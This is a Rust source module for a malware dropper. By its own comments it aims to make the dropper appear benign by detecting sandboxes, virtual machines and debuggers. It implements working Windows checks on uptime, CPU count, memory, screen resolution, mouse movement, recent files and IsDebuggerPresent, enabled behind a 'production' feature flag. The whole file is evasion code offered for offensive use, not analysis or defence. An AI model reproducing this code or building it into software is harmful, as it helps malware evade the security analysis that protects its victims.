//! Anti-Sandbox and Anti-Analysis Evasion Module
//!
//! This module implements multiple techniques to detect sandbox/VM environments
//! and avoid analysis. It's designed to make the dropper appear benign.

use rand::Rng;

/// Generate a random delay between min_ms and max_ms milliseconds
pub fn get_random_delay(min_ms: u64, max_ms: u64) -> u64 {
    let mut rng = rand::thread_rng();
    rng.gen_range(min_ms..=max_ms)
}

/// Check if we're running in a sandbox environment
/// Returns true if sandbox is detected
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn is_sandbox_detected() -> bool {
    // Multiple checks - if ANY returns true, we're likely in a sandbox

    // Check 1: System uptime (sandboxes are usually freshly started)
    if check_low_uptime() {
        return true;
    }

    // Check 2: CPU core count (VMs typically have few cores)
    if check_low_cpu_count() {
        return true;
    }

    // Check 3: Physical memory (VMs typically have low RAM)
    if check_low_memory() {
        return true;
    }

    // Check 4: Screen resolution (sandboxes often have low/unusual resolution)
    if check_screen_resolution() {
        return true;
    }

    // Check 5: Mouse movement (real users move the mouse)
    if check_no_mouse_movement() {
        return true;
    }

    // Check 6: Recent files (real systems have recent files)
    if check_no_recent_files() {
        return true;
    }

    // Check 7: Debugger detection
    if check_debugger_present() {
        return true;
    }

    false
}

/// Dummy implementation for dev mode or non-Windows
#[cfg(not(all(feature = "production", target_os = "windows")))]
pub fn is_sandbox_detected() -> bool {
    false
}

// =============================================================================
// Windows-specific detection functions
// =============================================================================

/// Check if system uptime is suspiciously low (less than 10 minutes)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_uptime() -> bool {
    use winapi::um::sysinfoapi::GetTickCount64;

    unsafe {
        let uptime_ms = GetTickCount64();
        // Less than 10 minutes = 600,000 ms
        uptime_ms < 600_000
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_uptime() -> bool {
    false
}

/// Check if CPU count is suspiciously low (less than 2 cores)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_cpu_count() -> bool {
    use std::mem::zeroed;
    use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};

    unsafe {
        let mut sys_info: SYSTEM_INFO = zeroed();
        GetSystemInfo(&mut sys_info);
        sys_info.dwNumberOfProcessors < 2
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_cpu_count() -> bool {
    false
}

/// Check if physical memory is suspiciously low (less than 4GB)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_memory() -> bool {
    use std::mem::{size_of, zeroed};
    use winapi::um::sysinfoapi::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut mem_status: MEMORYSTATUSEX = zeroed();
        mem_status.dwLength = size_of::<MEMORYSTATUSEX>() as u32;

        if GlobalMemoryStatusEx(&mut mem_status) != 0 {
            // Less than 4GB = 4 * 1024^3 bytes
            mem_status.ullTotalPhys < 4 * 1024 * 1024 * 1024
        } else {
            false
        }
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_low_memory() -> bool {
    false
}

/// Check if screen resolution is suspicious
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_screen_resolution() -> bool {
    use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        // Suspicious if resolution is below 1024x768 or exact VM sizes
        width < 1024 || height < 768 ||
        (width == 1024 && height == 768) ||  // Common VM default
        (width == 800 && height == 600) // Very common in sandboxes
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_screen_resolution() -> bool {
    false
}

/// Check if mouse hasn't moved (indicates automated execution)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_no_mouse_movement() -> bool {
    use std::mem::zeroed;
    use std::thread;
    use std::time::Duration;
    use winapi::shared::windef::POINT;
    use winapi::um::winuser::GetCursorPos;

    unsafe {
        let mut pos1: POINT = zeroed();
        GetCursorPos(&mut pos1);

        // Wait 2 seconds
        thread::sleep(Duration::from_secs(2));

        let mut pos2: POINT = zeroed();
        GetCursorPos(&mut pos2);

        // If mouse hasn't moved at all, likely sandbox
        pos1.x == pos2.x && pos1.y == pos2.y
    }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_no_mouse_movement() -> bool {
    false
}

/// Check if there are recent files (real systems have many)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_no_recent_files() -> bool {
    use std::env;
    use std::fs;
    use std::path::PathBuf;

    // Check %APPDATA%\Microsoft\Windows\Recent
    if let Ok(appdata) = env::var("APPDATA") {
        let recent_path = PathBuf::from(appdata)
            .join("Microsoft")
            .join("Windows")
            .join("Recent");

        if let Ok(entries) = fs::read_dir(recent_path) {
            // Use flatten to handle any errors in iteration
            let count = entries.flatten().count();
            // Real systems usually have many recent files
            return count < 5;
        }
    }

    // If we can't check, assume it's OK
    false
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_no_recent_files() -> bool {
    false
}

/// Check if a debugger is attached
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_debugger_present() -> bool {
    use winapi::um::debugapi::IsDebuggerPresent;

    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(not(all(feature = "production", target_os = "windows")))]
fn check_debugger_present() -> bool {
    false
}
